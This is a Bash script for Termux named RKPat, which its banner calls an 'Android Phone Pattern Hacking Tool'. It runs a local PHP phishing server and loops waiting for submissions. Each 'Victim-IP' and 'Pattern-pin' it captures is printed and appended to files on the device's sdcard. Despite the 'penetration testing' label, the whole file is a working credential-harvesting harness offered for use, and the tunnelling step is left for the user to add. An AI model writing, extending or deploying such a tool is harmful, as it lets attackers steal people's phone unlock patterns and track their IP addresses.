#!/bin/bash
# RKPat V 1.rk.beta
################ BY NITRO ###############
#       This Tool Is For Android  	#
#      Pattern Penetraion testing 	#
#   website: www.rkstudio.com		#
#----------Noob Hackers Aboute----------#
#      Website: www.noob-hackers.com    #
#   Github: www.github.com/noob-hackers #
#  This tool created by ( Noob hacker ) #
#	    Mortified By RK.		#
#      #
#############---RK Studio----############
termux='Termux'
tool_name='RKPat'
host='localhost'
port='8080'
version='\033[31m1.rk.beta\e[0m\e[1;92m'

check_status() {
        echo -ne "\e[1;92m[\e[0m+\e[1;92m] Internet Status : "
        timeout 3s curl -fIs "https://api.github.com" > /dev/null
        [ $? -eq 0 ] && echo -e "\e[1;92mOnline\e[0m" && return 0 && check_update || echo -e '\033[0;31mOffline\e[0m' && return 1;
}
run_create() {
    if [ ! -d /sdcard/$termux/ ]; then
        mkdir /sdcard/$termux
    fi
    if [ ! -d /sdcard/$termux/$tool_name/ ]; then
        mkdir /sdcard/$termux/$tool_name
    fi
}
####### Check if the pacages available #######
dependencies() {
  if [[ ! $(command -v php) ]]; then
    echo -e "\e[1;92mInstalling PHP....\e[0m"
    pkg install php -y
    echo -e "\e[1;92mPHP Installing successfuly\e[0m"
  fi
  if [[ ! $(command -v curl) ]]; then
    echo -e "\e[1;92mInstalling Curl....\e[0m"
    pkg install curl -y
    echo -e "\e[1;92mPHP Installing successfuly\e[0m"
  fi
}

####### Menu of the tool #######
menu() {
server="pattern"
start
}

####### Stop background execution #######
stop() {
checkphp=$(ps aux | grep -o "php" | head -n1)
checkproot=$(ps aux | grep -o "proot" | head -n1)

if [[ $checkphp == *'php'* ]]; then
pkill -f -2 php > /dev/null 2>&1
killall -2 php > /dev/null 2>&1
fi

if [[ $checkproot == *'proot'* ]]; then
pkill -f -2 proot > /dev/null 2>&1
killall -2 proot > /dev/null 2>&1
fi

if [[ -e sendlink ]]; then
rm -rf sendlink
fi
}

####### Banner for interface #######
banner() {
clear
printf '\n\033[36m        ███████████   █████   ████ ███████████             █████   \e[0m\n'
printf '\033[36m        ░░███░░░░░███ ░░███   ███░ ░░███░░░░░███           ░░███    \e[0m\n'
printf '\033[36m         ░███    ░███  ░███  ███    ░███    ░███  ██████   ███████  \e[0m\n'
printf '\033[36m         ░██████████   ░███████     ░██████████  ░░░░░███ ░░░███░   \e[0m\n'
printf '\033[36m         ░███░░░░░███  ░███░░███    ░███░░░░░░    ███████   ░███    \e[0m\n'
printf '\033[36m         ░███    ░███  ░███ ░░███   ░███         ███░░███   ░███ ███\e[0m\n'
printf '\033[36m        █████   █████ █████ ░░████ █████       ░░████████  ░░█████  \e[0m\n'
printf '\033[36m        ░░░░░   ░░░░░ ░░░░░   ░░░░ ░░░░░         ░░░░░░░░    ░░░░░   \e[0m\n\n'
printf '\e[1;33m     ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀\e[0m\n'
printf "\e[1;33m              $tool_name\e[0m\e[1;92m Version $version - by RK Riad \e[0m\033[36m[\e[1;33mRK Studio\e[0m\033[36m]\e[0m \n"
printf "\e[1;92m               www.rkstudio.com | www.github.com/rkstudio585 \e[0m \n"
printf "\e[1;33m               $tool_name\e[0m\e[1;92m is a Android Phone Pattern Hacking Tool.\e[0m \n"
printf "\e[1;33m       $tool_name\e[0m\e[1;92m Tool Modified by RK From hacklock Tool (Script By N17R0).\e[0m \n"
printf '\e[1;33m     ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀\e[0m\n'
printf "\n"
}

####### Catch creds #######
catch_cred() {
IFS=$'\n'
password=$(grep -o 'password : .*' $HOME/$tool_name/core/pattern/usernames.txt | cut -d ":" -f2)
ip=$(grep -o 'IP: .*' $HOME/$tool_name/core/pattern/ip.txt | cut -d ":" -f2)
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Victim-IP:\e[0m\e[1;77m %s\n\e[0m" $ip
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Pattern-pin:\e[0m\e[1;77m %s\n\e[0m" $password
cat $HOME/$tool_name/core/pattern/usernames.txt >> /sdcard/$termux/$tool_name/patterncode.cap
cat $HOME/$tool_name/core/pattern/ip.txt >> /sdcard/$termux/$tool_name/ip.cap
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m /sdcard/$termux/$tool_name/patterncode.cap\e[0m\n"
printf "\n"
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting For Next Pin, Press Ctrl + C to exit...\e[0m\n"
}

####### Server start/run #######
start() {
if [[ -e "$HOME/$tool_name/core/pattern/ip.txt" ]]; then
rm -rf $HOME/$tool_name/core/pattern/ip.txt
fi

if [[ -e "$HOME/$tool_name/core/pattern/usernames.txt" ]]; then
rm -rf $HOME/$tool_name/core/pattern/usernames.txt
fi

####### Server start process #######
printf "\e[1;92m[\e[0m+\e[1;92m] Local Server Running At: \033[36mhttp://$host:$port\e[0m\n"
cd $HOME/$tool_name/core/pattern && php -S localhost:8080 > /dev/null 2>&1 &
printf "\e[1;92m[\e[0m+\e[1;92m] Data Save At: \033[36m/sdcard/$termux/$tool_name\e[0m\n"
printf "\e[1;92m[\e[0m+\e[1;92m] Note:\e[0m ( \033[36mI Remove The Tunneling Features From This Tool\n\t  You Can Start Your Own Tunneling Server\e[0m )\n"
printf "\n"
checkfound
}

####### Check found data #######
checkfound() {
printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting For Pin,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do
if [[ -e "$HOME/$tool_name/core/pattern/usernames.txt" ]]; then
printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Pattern  Found!\n"
catch_cred
rm -rf $HOME/$tool_name/core/pattern/usernames.txt
fi
sleep 0.5
done
}

####### Restart the tool #######
run_create
banner
check_status
dependencies
menu
